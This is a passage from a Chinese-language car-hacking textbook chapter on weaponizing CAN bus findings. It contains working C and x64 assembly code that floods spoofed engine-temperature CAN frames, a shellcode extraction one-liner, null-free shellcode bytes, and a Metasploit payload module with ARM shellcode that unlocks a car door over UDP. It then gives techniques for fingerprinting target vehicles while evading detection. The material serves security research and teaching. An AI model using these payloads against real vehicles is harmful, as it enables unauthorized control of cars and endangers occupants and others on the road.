## 第十一章：**武器化 CAN 发现**

![image](img/common-01.jpg)

现在您可以探索并识别 CAN 数据包，接下来是时候将这些知识付诸实践，学习如何破解某些东西。您已经使用识别的数据包在车辆上执行了操作，但通过数据包解锁或启动汽车更多的是侦察，而不是实际的黑客攻击。本章的目标是展示如何将您的发现进行武器化。在软件世界中，*武器化*指的是“将一个漏洞变得易于执行。”当您首次发现一个漏洞时，可能需要多个步骤和特定的知识才能成功利用该漏洞。而武器化一个发现则能够让您将研究成果转化为一个独立的可执行文件。

在本章中，我们将看到如何执行一个操作——例如解锁一辆车——并将其融入 Metasploit 中，Metasploit 是一个设计用来利用软件漏洞的安全审计工具。Metasploit 是一个广泛使用的攻击框架，通常用于渗透测试。它拥有一个庞大的功能性漏洞库和*有效载荷*，有效载荷是指系统被攻击后执行的代码——例如，车辆被解锁后执行的代码。您可以在线和印刷版中找到大量关于 Metasploit 的信息，包括*Metasploit: The Penetration Tester’s Guide*（No Starch Press, 2011）。

为了武器化您的发现，您*将*需要编写代码。在本章中，我们将编写一个 Metasploit 有效载荷，旨在攻击信息娱乐系统或车载通信系统的架构。作为我们的第一个练习，我们将编写*Shellcode*，即注入到漏洞中的小段代码，用于创建一个 CAN 信号来控制车辆的温度计。我们将包括一个循环，确保伪造的 CAN 信号持续发送，并内置延迟以防止总线被数据包淹没，避免造成意外的拒绝服务攻击。接下来，我们将编写控制温度计的代码。然后，我们将把这段代码转换为 Shellcode，以便我们能够进行微调，使 Shellcode 变得更小或减少空值（NULL 值）。完成后，我们将拥有一个有效载荷，可以将其放入一个专用工具中或与像 Metasploit 这样的攻击框架一起使用。

**注意**

*为了充分理解本章内容，您需要对编程及编程方法有较好的理解。我假设您对 C 语言和汇编语言（包括 x86 和 ARM 架构）以及 Metasploit 框架有一定的了解。*

### 用 C 语言编写漏洞代码

我们将使用 C 语言编写这个伪造的 CAN 信号的漏洞代码，因为 C 语言编译后生成的汇编代码较为简洁，我们可以利用这些汇编代码来制作我们的 Shellcode。我们将使用 vcan0，一个虚拟 CAN 设备，来测试这个漏洞，但在实际攻击中，您应使用 can0 或您目标的真实 CAN 总线设备。列表 11-1 显示了*temp_shell*漏洞代码。

**注意**

*您需要创建一个虚拟 CAN 设备来测试此程序。有关详细信息，请参阅第三章。*

在 清单 11-1 中，我们创建了一个 CAN 包，仲裁 ID 为 0x510，并将第二个字节设置为 0xFF。0x510 包的第二个字节表示发动机温度。通过将该值设置为 0xFF，我们将报告的发动机温度调到最大值，从而表示车辆正在过热。这个包需要反复发送才能有效。

```
--- temp_shell.c
 #include <sys/types.h>
 #include <sys/socket.h>
 #include <sys/ioctl.h>
 #include <net/if.h>
 #include <netinet/in.h>
 #include <linux/can.h>
 #include <string.h>

 int main(int argc, char *argv[]) {
     int s;
     struct sockaddr_can addr;

     struct ifreq ifr;
     struct can_frame frame;

     s = socket(➊PF_CAN, SOCK_RAW, CAN_RAW);

     strcpy(ifr.ifr_name, ➋"vcan0");
     ioctl(s, SIOCGIFINDEX, &ifr);

     addr.can_family = AF_CAN;
     addr.can_ifindex = ifr.ifr_ifindex;

     bind(s, (struct sockaddr *)&addr, sizeof(addr));

➌    frame.can_id = 0x510;
     frame.can_dlc = 8;
     frame.data[1] = 0xFF;
     while(1) {
       write(s, &frame, sizeof(struct can_frame));
➍      usleep(500000);
     }
 }
```

*清单 11-1: C 循环发送 CAN ID 0x510*

清单 11-1 几乎以和设置正常网络套接字相同的方式设置了一个套接字，唯一不同的是它使用了 CAN 系列 `PF_CAN` ➊。我们使用 `ifr_name` 来定义我们希望监听的接口——在这种情况下是 `"vcan0"` ➋。

我们可以使用一个简单的帧结构来设置我们的帧，该结构与我们的包匹配，其中 `can_id` ➌ 包含仲裁 ID，`can_dlc` 包含包的长度，`data[]` 数组包含包的内容。

我们想要多次发送这个包，因此我们设置了一个 `while` 循环并设置了一个休眠定时器 ➍ 来定期发送该包。（如果没有 `sleep` 语句，你会导致总线拥堵，其他信号将无法正常通信。）

为了确认这段代码有效，可以按如下方式进行编译：

```
$ gcc -o temp_shellcode temp_shellcode.c
$ ls -l temp_shell
-rwxrwxr-x 1 craig craig 8722 Jan 6 07:39 temp_shell
$ ./temp_shellcode
```

现在，在另一个窗口中运行 `candump`，并在 vcan0 上查看输出，如下一个清单所示。*temp_shellcode* 程序应该发送必要的 CAN 包来控制温度计。

```
$ candump vcan0
  vcan0  ➊510   [8]   ➋5D  ➌FF  ➍40 00 00 00 00 00
  vcan0   510   [8]    5D   FF    40 00 00 00 00 00
  vcan0   510   [8]    5D   FF    40 00 00 00 00 00
  vcan0   510   [8]    5D   FF    40 00 00 00 00 00
```

`candump` 结果显示信号 0x510 ➊ 被反复广播，第二个字节正确设置为 0xFF ➌。注意 CAN 包的其他值被设置为我们没有指定的值，例如 0x5D ➋ 和 0x40 ➍。这是因为我们没有初始化 *frame.data* 部分，信号的其他字节中存在一些内存垃圾。为了去除这些内存垃圾，在你确定信号时，将 0x510 信号的其他字节设置为你在测试中记录的值——也就是说，将其他字节设置为 `frame.data[]`。

#### *转换为汇编代码*

尽管我们的 *temp_shell* 程序很小，但它仍然几乎有 9KB，因为我们是用 C 语言编写的，其中包含了一些其他库和代码存根，增加了程序的大小。我们希望我们的 shellcode 尽可能小，因为通常只有一个很小的内存区域可供我们的利用代码运行，而 shellcode 越小，它可以注入的地方就越多。

为了缩小程序的大小，我们将把 C 代码转换为汇编代码，然后再转换为汇编 shellcode。如果你已经熟悉汇编语言，你可以直接从一开始就用汇编写代码，但大多数人发现先在 C 语言中测试有效载荷更容易。

编写这个脚本与标准汇编脚本的唯一区别是你需要避免创建 NULL 值，因为你可能需要将 shellcode 注入到可能会以 NULL 结尾的缓冲区中。例如，作为字符串处理的缓冲区会扫描值，并在看到 NULL 值时停止。如果你的有效载荷中间有 NULL，代码就无法正常工作。（如果你知道你的有效载荷永远不会在作为字符串处理的缓冲区中使用，那么你可以跳过这一步。）

**注意**

*另外，你也可以使用编码器将有效载荷包装起来，以隐藏任何 NULL 值，但这样做会增加它的大小，而使用编码器超出了本章的范围。你也不会像在标准程序中那样有一个数据段来存储所有的字符串和常量值。我们希望我们的代码是自给自足的，不依赖于 ELF 头部为我们设置任何值，所以如果我们想在有效载荷中使用字符串，我们必须在如何将它们放置到栈上方面发挥创造性。*

为了将 C 代码转换为汇编，你需要查看系统的头文件。所有方法调用都会直接进入内核，你可以在这个头文件中看到它们：

```
/usr/include/asm/unistd_64.h
```

在这个示例中，我们将使用 64 位汇编，它使用以下寄存器：`%rax`、`%rbx`、`%rcx`、`%rdx`、`%rsi`、`%rdi`、`%rbp`、`%rsp`、`%r8`、`%r15`、`%rip`、`%eflags`、`%cs`、`%ss`、`%ds`、`%es`、`%fs` 和 `%gs`。

要调用内核系统调用，请使用 `syscall` —— 而不是 `int 0x80` —— 其中 `%rax` 是系统调用号，可以在 *unistd_64.h* 中找到。参数按以下顺序通过寄存器传递：`%rdi`、`%rsi`、`%rdx`、`%r10`、`%r8` 和 `%r9`。

注意，寄存器的顺序与传递参数给函数时有所不同。

清单 11-2 显示了我们存储在*temp_shell.s* 文件中的汇编代码。

```
--- temp_shell.S
section .text
global _start

_start:
                             ; s = socket(PF_CAN, SOCK_RAW, CAN_RAW);
  push 41                    ; Socket syscall from unistd_64.h
  pop rax
  push 29                    ; PF_CAN from socket.h
  pop rdi
  push 3                     ; SOCK_RAW from socket_type.h
  pop rsi
  push 1                     ; CAN_RAW from can.h
  pop rdx
  syscall
  mov r8, rax                ; s / File descriptor from socket
                             ; strcpy(ifr.ifr_name, "vcan0");
  sub rsp, 40                ;  struct ifreq is 40 bytes
  xor r9, r9                 ; temp register to hold interface name
  mov r9, 0x306e616376       ; vcan0
  push r9
  pop qword [rsp]
                             ; ioctl(s, SIOCGIFINDEX, &ifr);
  push 16                    ; ioctrl from unistd_64.h
  pop rax
  mov rdi, r8                ; s / File descriptor
  push 0x8933                ; SIOCGIFINDEX from ioctls.h
  pop rsi
  mov rdx, rsp               ; &ifr
  syscall
  xor r9, r9                 ; clear r9
  mov r9, [rsp+16]           ; ifr.ifr_ifindex
                             ; addr.can_family = AF_CAN;
  sub rsp, 16                ; sizeof sockaddr_can
  mov word [rsp], 29         ; AF_CAN == PF_CAN
                             ; addr.can_ifindex = ifr.ifr_ifindex;
  mov [rsp+4], r9
                             ; bind(s, (struct sockaddr *)&addr,
sizeof(addr));
  push 49                    ; bind from unistd_64.h
  pop rax
  mov rdi, r8                ; s /File descriptor
  mov rsi, rsp               ; &addr
  mov rdx, 16                ; sizeof(addr)
  syscall
  sub rsp, 16                ; sizeof can_frame
  mov word [rsp], 0x510      ; frame.can_id = 0x510;

  mov byte [rsp+4], 8        ;  frame.can_dlc = 8;

  mov byte [rsp+9], 0xFF     ;  frame.data[1] = 0xFF;
                             ; while(1)
loop:
                             ; write(s, &frame, sizeof(struct can_frame));
  push 1                     ; write from unistd_64.h
  pop rax
  mov rdi, r8                ; s / File descriptor
  mov rsi, rsp               ; &frame
  mov rdx, 16                ; sizeof can_frame
  syscall
                             ; usleep(500000);
  push 35                    ; nanosleep from unistd_64.h
  pop rax
  sub rsp, 16
  xor rsi, rsi
  mov [rsp], rsi             ; tv_sec
  mov dword [rsp+8], 500000  ; tv_nsec
  mov rdi, rsp
  syscall
  add rsp, 16
  jmp loop
```

*清单 11-2：在 64 位汇编中发送 CAN ID 0x510 数据包*

清单 11-2 中的代码与我们在 清单 11-1 中编写的 C 代码完全相同，只不过现在是用 64 位汇编语言编写的。

**注意**

*我已经在代码中添加了注释，展示了原始 C 代码的每一行与相应汇编代码块之间的关系。*

要编译和链接程序使其成为可执行文件，可以使用 `nasm` 和 `ld`，如下面所示：

```
$ nasm -f elf64 -o temp_shell2.o temp_shell.S
$ ld -o temp_shell2 temp_shell2.o
$ ls -l temp_shell2
-rwxrwxr-x 1 craig craig ➊1008 Jan  6 11:32 temp_shell2
```

目标头部的大小现在显示程序大约有 1008 字节 ➊，即超过 1KB，比编译后的 C 程序小得多。一旦我们去除链接步骤（`ld`）引入的 ELF 头部，代码将会更小。

#### *将汇编代码转换为 Shellcode*

现在你的程序大小更加合适，你可以使用一行 Bash 命令将目标文件转换为 shellcode，直接在命令行中完成，如 清单 11-3 所示。

```
$ for i in $(objdump -d temp_shell2.o -M intel |grep "^ " |cut -f2); do echo
-n '\x'$i; done;echo
\x6a\x29\x58\x6a\x1d\x5f\x6a\x03\x5e\x6a\x01\x5a\x0f\x05\x49\x89\xc0\x48\x83\
xec\x28\x4d\x31\xc9\x49\xb9\x76\x63\x61\x6e\x30\x00\x00\x00\x41\x51\x8f\x04\
x24\x6a\x10\x58\x4c\x89\xc7\x68\x33\x89\x00\x00\x5e\x48\x89\xe2\x0f\x05\x4d\
x31\xc9\x4c\x8b\x4c\x24\x10\x48\x83\xec\x10\x66\xc7\x04\x24\x1d\x00\x4c\x89\
x4c\x24\x04\x6a\x31\x58\x4c\x89\xc7\x48\x89\xe6\xba\x10\x00\x00\x00\x0f\x05\
x48\x83\xec\x10\x66\xc7\x04\x24\x10\x05\xc6\x44\x24\x04\x08\xc6\x44\x24\x09\
xff\x6a\x01\x58\x4c\x89\xc7\x48\x89\xe6\xba\x10\x00\x00\x00\x0f\x05\x6a\x23\
x58\x48\x83\xec\x10\x48\x31\xf6\x48\x89\x34\x24\xc7\x44\x24\x08\x20\xa1\x07\
x00\x48\x89\xe7\x0f\x05\x48\x83\xc4\x10\xeb\xcf
```

*清单 11-3：将目标文件转换为 shellcode*

这系列命令会遍历你的编译后的目标文件，并提取组成程序的十六进制字节，将其打印到屏幕上。输出的字节就是你的 shellcode。如果你计算打印出的字节数，你会发现这个 shellcode 是 168 字节——这就合适了。

#### *去除 NULL 值*

但我们还没完成。如果你查看示例 11-3 中的 shellcode，你会注意到仍然存在一些 NULL 值（`\x00`），我们需要将其去除。去除的方法之一是使用 Metasploit 提供的加载器，将字节包装起来，或者重写代码的部分以消除 NULL 值。

你还可以重写你的汇编代码，以便从最终的汇编中去除 NULL 值，通常方法是将 MOV 指令和包含 NULL 值的值替换为清除寄存器的指令，并添加另一条指令以增加适当的值。例如，像`MOV RDI, 0x03`这样的指令会转换为包含许多前导 NULL 值的十六进制数，直到 3。如果要绕过这一点，你可以首先使用`XOR RDI, RDI`将 RDI 清零，这样 RDI 就会变成 NULL，然后通过`INC RDI`指令增加 RDI 三次。在某些地方，你可能需要发挥创造力。

一旦你完成了去除这些 NULL 值的修改，你可以将 shellcode 转换为可以嵌入字符串缓冲区的代码。我不会展示修改后的汇编代码，因为它不太容易读取，但新的 shellcode 看起来是这样的：

```
\x6a\x29\x58\x6a\x1d\x5f\x6a\x03\x5e\x6a\x01\x5a\x0f\x05\x49\x89\xc0\x48\x83\
xec\x28\x4d\x31\xc9\x41\xb9\x30\x00\x00\x00\x49\xc1\xe1\x20\x49\x81\xc1\x76\
x63\x61\x6e\x41\x51\x8f\x04\x24\x6a\x10\x58\x4c\x89\xc7\x41\xb9\x11\x11\x33\
x89\x49\xc1\xe9\x10\x41\x51\x5e\x48\x89\xe2\x0f\x05\x4d\x31\xc9\x4c\x8b\x4c\
x24\x10\x48\x83\xec\x10\xc6\x04\x24\x1d\x4c\x89\x4c\x24\x04\x6a\x31\x58\x4c\
x89\xc7\x48\x89\xe6\xba\x11\x11\x11\x10\x48\xc1\xea\x18\x0f\x05\x48\x83\xec\
x10\x66\xc7\x04\x24\x10\x05\xc6\x44\x24\x04\x08\xc6\x44\x24\x09\xff\x6a\x01\
x58\x4c\x89\xc7\x48\x89\xe6\x0f\x05\x6a\x23\x58\x48\x83\xec\x10\x48\x31\xf6\
x48\x89\x34\x24\xc7\x44\x24\x08\x00\x65\xcd\x1d\x48\x89\xe7\x0f\x05\x48\x83\
xc4\x10\xeb\xd4
```

#### *创建 Metasploit 载荷*

示例 11-4 是一个使用我们 shellcode 的 Metasploit 载荷模板。将这个载荷保存在*modules/payloads/singles/linux/armle/*目录下，并给它起一个类似于你将要执行的操作的名字，比如*flood_temp.rb*。示例 11-4 中的示例载荷是为一个在 ARM Linux 上运行、使用以太网总线的车载娱乐系统设计的。这个 shellcode 的功能是解锁汽车门，而不是修改温度。以下代码是标准的载荷结构，唯一不同的是我们将`payload`变量设置为所需的车辆 shellcode。

```
   Require 'msf/core'

   module Metasploit3
      include Msf::Payload::Single
      include Msf::Payload::Linux

     def initialize(info = {})
       super(merge_info(info,
         'Name'          => 'Unlock Car',
         'Description'   => 'Unlocks the Driver Car Door over Ethernet',
         'Author'        => 'Craig Smith',
         'License'       => MSF_LICENSE,
         'Platform'      => 'linux',
         'Arch'          => ARCH_ARMLE))
      end
      def generate_stage(opts={})

➊      payload = "\x02\x00\xa0\xe3\x02\x10\xa0\xe3\x11\x20\xa0\xe3\x07\x00\x2d\
   xe9\x01\x00\xa0\xe3\x0d\x10\xa0\xe1\x66\x00\x90\xef\x0c\xd0\x8d\xe2\x00\x60\
   xa0\xe1\x21\x13\xa0\xe3\x4e\x18\x81\xe2\x02\x10\x81\xe2\xff\x24\xa0\xe3\x45\
   x28\x82\xe2\x2a\x2b\x82\xe2\xc0\x20\x82\xe2\x06\x00\x2d\xe9\x0d\x10\xa0\xe1\
   x10\x20\xa0\xe3\x07\x00\x2d\xe9\x03\x00\xa0\xe3\x0d\x10\xa0\xe1\x66\x00\x90\
   xef\x14\xd0\x8d\xe2\x12\x13\xa0\xe3\x02\x18\x81\xe2\x02\x28\xa0\xe3\x00\x30\
   xa0\xe3\x0e\x00\x2d\xe9\x0d\x10\xa0\xe1\x0c\x20\xa0\xe3\x06\x00\xa0\xe1\x07\
   x00\x2d\xe9\x09\x00\xa0\xe3\x0d\x10\xa0\xe1\x66\x00\x90\xef\x0c\xd0\x8d\xe2\
   x00\x00\xa0\xe3\x1e\xff\x2f\xe1"
      end
   end
```

*示例 11-4：使用我们的 shellcode 的 Metasploit 载荷模板*

在示例 11-4 中的`payload`变量 ➊ 会被转换成以下 ARM 汇编代码：

```
      /* Grab a socket handler for UDP */
      mov     %r0, $2 /* AF_INET */
      mov     %r1, $2 /* SOCK_DRAM */
      mov     %r2, $17        /* UDP */
      push    {%r0, %r1, %r2}
      mov     %r0, $1 /* socket */
      mov     %r1, %sp
      svc     0x00900066
      add     %sp, %sp, $12

      /* Save socket handler to %r6 */
      mov     %r6, %r0

      /* Connect to socket */
      mov     %r1, $0x84000000
      add     %r1, $0x4e0000
      add     %r1, $2         /* 20100 & AF_INET */
      mov     %r2, $0xff000000
      add     %r2, $0x450000
      add     %r2, $0xa800
      add     %r2, $0xc0 /* 192.168.69.255 */
      push    {%r1, %r2}
      mov     %r1, %sp
      mov     %r2, $16        /* sizeof socketaddr_in */
      push    {%r0, %r1, %r2}
      mov     %r0, $3 /* connect */
      mov     %r1, %sp
      svc     0x00900066
      add     %sp, %sp, $20

      /* CAN Packet */
      /* 0000 0248 0000 0200 0000 0000 */
      mov     %r1, $0x48000000  /* Signal */
      add     %r1, $0x020000
      mov     %r2, $0x00020000  /* 1st 4 bytes */
      mov     %r3, $0x00000000  /* 2nd 4 bytes */
      push    {%r1, %r2, %r3}
      mov     %r1, %sp
      mov     %r2, $12        /* size of pkt */

      /* Send CAN Packet over UDP */
      mov     %r0, %r6
      push    {%r0, %r1, %r2}
      mov     %r0, $9 /* send */
      mov     %r1, %sp
      svc     0x00900066
      add     %sp, %sp, $12

      /* Return from main - Only for testing, remove for exploit */
      mov     %r0, $0
      bx      lr
```

这段代码类似于我们在示例 11-3 中创建的 shellcode，区别在于它是为 ARM 架构构建的，而不是 x64 Intel 架构，并且它通过以太网工作，而不是直接与 CAN 驱动程序通信。当然，如果车载娱乐中心使用的是 CAN 驱动程序而非以太网驱动程序，你就需要编写代码来操作 CAN 驱动程序，而不是网络。

一旦你准备好负载，你可以将其添加到现有 Metasploit 漏洞利用库中，用于攻击车辆的信息娱乐中心。因为 Metasploit 会解析负载文件，你可以简单地选择它作为选项，针对任何目标信息娱乐单元进行攻击。如果发现漏洞，负载将运行，并执行你模仿的封包操作，如解锁车门、启动车辆等。

**注意**

*你可以用汇编语言编写武器化程序，并将其作为漏洞利用工具，而不是通过 Metasploit，但我建议使用 Metasploit。它有大量基于车辆的负载和漏洞利用工具，因此，值得花时间将你的代码转换为 Metasploit 兼容的格式。*

### 确定目标车辆品牌

到目前为止，你已经找到了一个信息娱乐单元中的漏洞，并且你已经准备好了 CAN 总线封包负载。如果你的目标是仅对一种类型的车辆进行安全测试，那就没问题。但如果你打算在所有安装了特定信息娱乐或远程信息处理系统的车辆上使用你的负载，那么你还有一些工作要做；这些系统由不同的制造商安装，且 CAN 总线网络在不同制造商之间甚至不同车型之间有所不同。

为了在多种车辆类型上使用此漏洞，你需要在发送封包之前检测出你的 shellcode 正在执行的车辆品牌。

**警告**

*未能检测到车辆的品牌可能会导致意外结果，并且可能非常危险！例如，在一种品牌的车辆上解锁车门的封包可能会导致另一辆车的刹车失灵。你无法确定你的漏洞在哪里运行，因此一定要验证车辆的品牌。*

确定车辆品牌类似于确定目标主机正在运行哪个操作系统版本，就像我们在《确定更新文件类型》一章中所做的那样，在第 160 页中。你可能可以通过在你的 shellcode 中添加扫描 RAM 的功能，在信息娱乐单元的内存空间中找到这些信息。否则，有两种方法可以通过 CAN 总线确定你的代码正在运行的车辆类型：交互式探测和被动 CAN 总线指纹识别。

#### *交互式探测*

交互式探测方法涉及使用 ISO-TP 封包查询包含 VIN 的 PID。如果我们能够访问 VIN 并解码，它将告诉我们目标车辆的品牌和型号。

##### 查询车辆识别码（VIN）

请回忆一下在“通过 ISO-TP 和 CAN 发送数据”中提到的内容，在第 55 页你使用 OBD-II 模式 2 的 PID 9 协议来查询 VIN。这个协议使用 ISO-TP 多包标准，在 Shell 代码中实现可能会有些繁琐。然而，你可以只使用 ISO-TP 标准中需要的部分，而不必完整实现它。例如，由于 ISO-TP 作为正常的 CAN 流量运行，你可以使用 ID 为 0x7DF 的数据包发送 Shell 代码，数据包负载为 0x02 0x09 0x02；然后你可以接收 ID 为 0x7E8 的正常 CAN 流量。第一个接收到的数据包将是多部分数据包的一部分，后续会接收剩余的数据包。第一个数据包包含最重要的信息，可能是你区分车辆所需的全部信息。

**注意**

*你可以自己组装多部分数据包，然后实现一个完整的 VIN 解码器，但这样做可能效率不高。无论是重新组装完整的 VIN，还是只使用 VIN 的一部分，自己解码 VIN 都会更好。*

##### 解码 VIN

VIN 的布局相当简单。前 3 个字符，被称为*世界制造商标识符（WMI）代码*，表示车辆的制造商。WMI 代码中的第一个字符决定了制造地区。接下来的两个字符是制造商特定的。（由于列表过长，无法在此列出，但你可以通过简单的在线搜索找到 WMI 代码的列表。）例如，在第四章（见表 4-4 在第 57 页）中，我们的 VIN 是 1G1ZT53826F109149，这给出了 WMI 为 1G1。根据 WMI 代码，这表明该车的制造商是雪佛兰。

VIN 的下 6 个字节构成了*车辆描述部分（VDS）*。VDS 中的前 2 个字节——即 VIN 的第 4 和第 5 字节——告诉我们车辆的型号和其他规格信息，比如车辆有多少个门、发动机的大小等等。例如，在 VIN 1G1ZT53826F109149 中，VDS 是 ZT5382，其中*ZT*给出了车型。通过快速在线搜索，我们得知这是一辆雪佛兰 Malibu。（VDS 的详细信息会根据车辆和制造商的不同而有所变化。）

如果你需要知道车辆的制造年份，你将需要抓取更多的数据包，因为年份存储在第 10 字节中。这个字节不能直接转换，你需要使用一个表格来确定年份（见表 11-1）。

**表 11-1：** 确定制造年份

| **字符** | **年份** | **字符** | **年份** | **字符** | **年份** | **字符** | **年份** |
| --- | --- | --- | --- | --- | --- | --- | --- |
| A | 1980 | L | 1990 | Y | 2000 | A | 2010 |
| B | 1981 | M | 1991 | 1 | 2001 | B | 2011 |
| C | 1982 | N | 1992 | 2 | 2002 | C | 2012 |
| D | 1983 | P | 1993 | 3 | 2003 | D | 2013 |
| E | 1984 | R | 1994 | 4 | 2004 | E | 2014 |
| F | 1985 | W | 1995 | 5 | 2005 | F | 2015 |
| G | 1986 | T | 1996 | 6 | 2006 | G | 2016 |
| H | 1987 | V | 1997 | 7 | 2007 | H | 2017 |
| J | 1988 | W | 1998 | 8 | 2008 | J | 2018 |
| K | 1989 | X | 1999 | 9 | 2009 | K | 2019 |

对于利用漏洞来说，知道年份并不像知道你的代码是否能在目标车辆上运行那么重要，但如果你的漏洞依赖于特定的品牌、型号和年份，你需要执行这一步。例如，如果你知道你所针对的车载信息娱乐系统既安装在本田思域（Honda Civic）也安装在庞蒂亚克阿兹特克（Pontiac Aztek）上，你可以通过检查 VIN 来确认目标车辆是否符合要求。本田是日本制造的，而庞蒂亚克是北美制造的，因此 WMI 的第一个字节分别需要是*J*或*1*。

**注意**

*如果你所针对的车辆上的无线电单元安装在其他你不了解的车辆上，你的有效载荷仍然能够在其他北美或日本制造的车辆上工作。*

一旦你知道了运行平台，你可以选择执行正确的有效载荷，如果你找到了合适的载体，或者优雅地退出。

##### 交互式探测的检测风险

使用交互式探测来确定目标车辆的品牌的优势在于，这种方法适用于任何品牌或型号的汽车。每辆车都有一个 VIN 码，可以解码得到所需的信息，并且你不需要预先了解平台的 CAN 数据包就能进行 VIN 查询。然而，这种方法确实需要你*传输*查询到 CAN 总线上，这意味着它是可检测的，你可能会在触发有效载荷之前被发现。（此外，我们的示例使用了廉价的黑客技术来避免正确处理 ISO-TP，这可能导致错误。）

#### *被动 CAN 总线指纹识别*

如果你担心在使用有效载荷之前被检测到，应该避免任何形式的主动探测。被动 CAN 总线指纹识别更不容易被检测到，因此如果你发现你所针对的车型不被你的漏洞支持，你可以优雅地退出，而不会产生任何网络流量，从而降低被检测到的风险。被动 CAN 总线指纹识别包括监控网络流量，收集特定车型所独有的信息，然后将这些信息与已知指纹进行匹配。这一研究领域相对较新，截至本文写作时，唯一可用的收集和检测总线指纹的工具是 Open Garages 发布的工具。

被动 CAN 总线指纹识别的概念来源于 IPv4 的被动操作系统指纹识别，例如 p0f 工具所使用的技术。在被动 IPv4 指纹识别中，数据包头部的细节，例如窗口大小和 TTL 值，可以用来识别创建数据包的操作系统。通过监控网络流量，并了解哪些操作系统默认设置了数据包头部中的哪些值，可以在不通过网络传输的情况下确定数据包的来源操作系统。

我们可以使用类似的方法论来处理 CAN 数据包。CAN 的唯一标识符如下：

• 动态大小（否则设置为 8 字节）

• 信号间的间隔

• 填充值（0x00, 0xFF, 0xAA 等等）

• 使用的信号

因为不同的汽车品牌和型号使用不同的信号，独特的信号 ID 可以揭示正在检查的车辆类型。即使信号 ID 相同，时序间隔也可能是独特的。每个 CAN 数据包都有一个 DLC 字段，用来定义数据的长度，尽管一些制造商默认将其设置为 8，并通过填充数据来确保始终使用 8 个字节。制造商会使用不同的值来填充数据，因此这也可以作为识别品牌的指标。

##### CAN 的指纹

被动指纹识别的 Open Garages 工具叫做 *CAN 的指纹（c0f）*，并可以在 *[`github.com/zombieCraig/c0f/`](https://github.com/zombieCraig/c0f/)* 免费获得。c0f 会采样大量 CAN 总线数据包，并创建一个可以稍后识别和存储的指纹。c0f 的指纹——一个可供 JSON 消费的对象——可能如下所示：

```
{"Make": "Unknown", "Model": "Unknown", "Year": "Unknown", "Trim": "Unknown",
"Dynamic": "true", "Common": [ { "ID": "166" },{ "ID": "158" },{ "ID": "161" },
{ "ID": "191" },{ "ID": "18E" },{ "ID": "133" },{ "ID": "136" },{ "ID": "13A" },
{ "ID": "13F" },{ "ID": "164" },{ "ID": "17C" },{ "ID": "183" },{ "ID": "143" },
{ "ID": "095" } ], "MainID": "143", "MainInterval": "0.009998683195847732"}
```

五个字段构成了指纹：`Make`、`Model`、`Year`、`Trim` 和 `Dynamic`。如果数据库中没有这些值，前四个值——`Make`、`Model`、`Year` 和 `Trim`——将都列为 `Unknown`。表格 11-2 列出了独特于车辆的已识别属性。

**表格 11-2：** 被动指纹识别的车辆属性

| **属性** | **值类型** | **描述** |
| --- | --- | --- |
| 动态 | 二进制值 | 如果 DLC 有动态长度，则设置为 `true`。 |
| 填充 | 十六进制值 | 如果使用填充，则此属性将设置为用于填充的字节。此示例没有填充，因此未包括此属性。 |
| 常见 | ID 数组 | 基于总线上频率出现的常见信号 ID。 |
| 主 ID | 十六进制 ID | 基于出现频率和间隔的最常见信号 ID。 |
| 主间隔 | 浮动值 | 总线中最常见的 ID（MainID）重复的最短间隔时间。 |

##### 使用 c0f

许多以间隔触发的 CAN 信号将在日志文件中以相同的次数出现，且出现之间的间隔相似。c0f 将根据出现次数将信号分组。

为了更好地了解 c0f 如何确定常见和主 ID，请运行 `c0f` 并使用 `--print-stats` 选项，如清单 11-5 所示。

```
   $ bundle exec bin/c0f --logfile test/sample-can.log --print-stats
     Loading Packets...   6158/6158  |*******************************************
   *******|  0:00
   Packet Count (Sample Size): 6158
   Dynamic bus: true
   [Packet Stats]
    166 [4] interval 0.010000110772939828 count 326
    158 [8] interval 0.009999947181114783 count 326
    161 [8] interval 0.009999917103694035 count 326
    191 [7] interval 0.009999932509202223 count 326
    18E [3] interval 0.010003759677593524 count 326
    133 [5] interval 0.0099989076761099 count 326
    136 [8] interval 0.009998913544874925 count 326
    13A [8] interval 0.009998914278470553 count 326
    13F [8] interval 0.009998904741727389 count 326
    164 [8] interval 0.009998898872962365 count 326
    17C [8] interval 0.009998895204984225 count 326
    183 [8] interval 0.010000821627103366 count 326
➊  039 [2] interval 0.015191149488787786 count 215
➋  143 [4] interval 0.009998683195847732 count 326
    095 [8] interval 0.010001396766075721 count 326
    1CF [6] interval 0.01999976016857006 count 163
    1DC [4] interval 0.019999777829205548 count 163
    320 [3] interval 0.10000315308570862 count 33
    324 [8] interval 0.10000380873680115 count 33
    37C [8] interval 0.09999540448188782 count 33
    1A4 [8] interval 0.01999967775227111 count 163
    1AA [8] interval 0.019999142759334967 count 162
    1B0 [7] interval 0.019999167933967544 count 162
    1D0 [8] interval 0.01999911758470239 count 162
    294 [8] interval 0.039998024702072144 count 81
    21E [7] interval 0.039998024702072144 count 81
    309 [8] interval 0.09999731183052063 count 33
    333 [7] interval 0.10000338862019201 count 32
    305 [2] interval 0.1043075958887736 count 31
    40C [8] interval 0.2999687910079956 count 11
    454 [3] interval 0.2999933958053589 count 11
    428 [7] interval 0.3000006914138794 count 11
    405 [8] interval 0.3000005006790161 count 11
    5A1 [8] interval 1.00019109249115 count 3
```

*清单 11-5：运行 `c0f` 并使用 `--print-stats` 选项*

常见 ID 是信号的组合，这些信号出现了 326 次（出现次数最多）。主 ID 是具有最短平均间隔的常见 ID——在这种情况下，信号 0x143，间隔为 0.009998 毫秒 ➋。

c0f 工具将这些指纹保存在数据库中，这样你就可以被动地识别总线，但为了 shellcode 开发的目的，我们可以仅使用主 ID 和主间隔，快速判断我们是否在预期的目标上。以 c0f 统计输出中显示的结果为目标，我们将监听 CAN 套接字上的信号 0x143，并知道最长等待时间为 0.009998 毫秒，如果我们没有看到 ID 为 0x143 的信号，就会中止。（只要确保在检查从开始嗅探总线以来已经过去的时间时，使用高精度的时间方法，例如`clock_gettime`。）通过确保你也识别了所有常见 ID，你可以获得更精细的识别。

设计出不受 c0f 支持的指纹是可能的。例如，注意在 c0f 统计输出中，信号 ID 0x039 出现了 215 次 ➊。与其他常见数据包相比，这是一个奇怪的比例。常见数据包大约每 5%的时间出现一次，但 0x039 大约每 3.5%的时间出现一次，并且是唯一具有该比例的信号。你的 shellcode 可以收集一个常见的 ID，并计算 0x039 出现的比例，看看它是否匹配。这可能只是基于记录时当前车辆条件的偶然情况，但可能值得调查。应该增加样本量，并使用多次运行来验证发现的结果，然后再将检测嵌入到你的 shellcode 中。

**注意**

